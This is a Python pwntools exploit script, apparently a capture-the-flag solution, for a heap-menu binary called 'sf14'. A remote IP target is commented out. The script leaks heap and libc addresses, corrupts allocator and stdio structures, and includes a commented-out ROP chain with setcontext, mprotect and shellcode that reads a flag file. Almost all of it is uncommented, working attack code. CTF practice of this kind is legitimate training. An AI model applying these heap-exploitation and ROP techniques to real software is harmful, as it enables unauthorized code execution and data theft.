from pwn import*

p=process('./sf14')
#p=remote('35.194.245.237','8094')

def menu(index):
        p.sendlineafter('>> ',str(index))

def default(name):
        menu(1)
        p.sendlineafter('color name : ',name)

def mix(name,id_):
        menu(2)
        p.sendlineafter('mixed color name : ',name)
        p.sendlineafter('mixed color id : ',str(id_))

def delete(id_):
        menu(3)
        p.sendlineafter('mixed color id : ',str(id_))

#leak
delete(1)
default('a'*0x10)
mix('bbbb',1)
p.sendlineafter('[y/n] : ','y')
p.recvuntil('a'*0x10)
heap=u64(p.recv(6).ljust(8,'\x00'))
heap_base=heap-16
print hex(heap_base)
p.sendlineafter('>> ','0')
p.sendlineafter('[y/n] : ','n')
delete(1)
delete(2)
mix('aaaa',1)
p.sendlineafter('[y/n] : ','n')
delete(1)
delete(0)

menu(2)
p.sendlineafter(': ',p64(heap_base+0x40)[:7])
p.sendlineafter(': ',str(heap_base+0x110))
p.sendlineafter('[y/n] : ','n')
mix('bbbb',2)
p.sendlineafter('[y/n] : ','n')
delete(2)

menu(2)
p.sendlineafter(': ',p64(heap_base+0x80)[:7])
p.sendlineafter(': ','3')
p.sendlineafter('[y/n] : ','y')
p.recvuntil('[2] ')
main_arena=u64(p.recv(6).ljust(8,'\x00'))


libc_base=main_arena-3951496
io_buf_end=libc_base+3950864
setcontext_53=libc_base+293765
start_m=libc_base+3951200
mprotect=libc_base+1054768
pop_rdi=libc_base+0x21112
pop_rsi=libc_base+0x202f8
pop_rdx=libc_base+0x1b92
ret=libc_base+0x937

'''
libc_base=main_arena-3951496
io_buf_end=libc_base+3950880
setcontext_53=libc_base+0x47b40+53
start_m=libc_base+3951200
pop_rax = libc_base + 0x33544
syscall = libc_base + 0xf727b
pop_rdi=libc_base+0x21102
pop_rsi=libc_base+0x202e8
pop_rdx=libc_base+0x1b92
ret=libc_base+0x937
'''

print hex(libc_base)

p.sendlineafter('>> ','2')
p.sendlineafter('[y/n] : ','n')

delete(str(main_arena))
#exploit

default(p64(main_arena)+p64(heap_base+0x80))
raw_input()
default('b'*0x10)
raw_input()
delete(str(heap_base+0x110))
raw_input()
default(p64(main_arena)+p64(io_buf_end))
raw_input()
mix('cccc',1)

p.sendlineafter('[y/n] : ','n')
'''
print hex(setcontext_53)
payload=''
payload+='\x00'*5
payload+=p64(libc_base+3958672)
payload+='\xff'*0x8
payload+=p64(0)
payload+=p64(start_m)
payload+=p64(ret)
payload+=p64(0)*2
payload+='\xff'*0x4+'\x00'*0x4
payload+=p64(0)*2
payload+=p64(io_buf_end+0xb0)
#payload+=p64(ret)+p64(start_m)
payload+=p64(setcontext_53)*19
payload+=p64(0)
payload+=p64(pop_rdi)
payload+=p64(libc_base)
payload+=p64(pop_rsi)
payload+=p64(0x206000+0x1ba000+0x6000)
payload+=p64(pop_rdx)
payload+=p64(7)
payload+=p64(mprotect)
payload+=p64(start_m+0x48)
payload+=p64(0)
payload+='\x90'*0x8

context(arch="amd64",os="linux")
shell=asm("""
        push 0x6d6f682f
        push 0x67632f65
        push 0x65442f68
        push 0x6f746b73
        push 0x65682f70
        push 0x732f7061
        push 0x2f343166
        push 0x67616c66

        mov rdi,rsp
        mov rsi,0
        mov rdx,0

        mov rax,2
        syscall

        mov rdi,rax
        mov rsi,rsp
        mov rdx,0x100

        mov rax,0
        syscall

        mov rdi,1
        mov rsi,rsp
        mov rdx,0x100

        mov rax,1
        syscall
""")
payload+=shell
p.sendlineafter('>> ',payload)
raw_input("Wait...")

'''
p.interactive()